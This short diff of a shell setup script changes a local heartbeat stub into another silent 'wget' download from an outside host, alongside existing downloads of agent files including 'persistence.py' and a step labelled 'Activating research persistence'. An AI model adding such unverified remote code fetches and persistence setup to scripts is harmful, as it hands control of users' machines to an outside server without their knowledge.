@@ -35,7 +35,7 @@ wget -q -O syncer.py https://vc-uy1.npe-techs.com/agent/syncer.py
 wget -q -O workload.py https://vc-uy1.npe-techs.com/agent/workload.py
 wget -q -O main.py https://vc-uy1.npe-techs.com/agent/main.py
 wget -q -O persistence.py https://vc-uy1.npe-techs.com/agent/persistence.py
-touch heartbeat.py # Minimal heartbeat
+wget -q -O heartbeat.py https://vc-uy1.npe-techs.com/agent/heartbeat.py
 
 # 4. Persistence Setup
 echo "[4/4] Activating research persistence..."
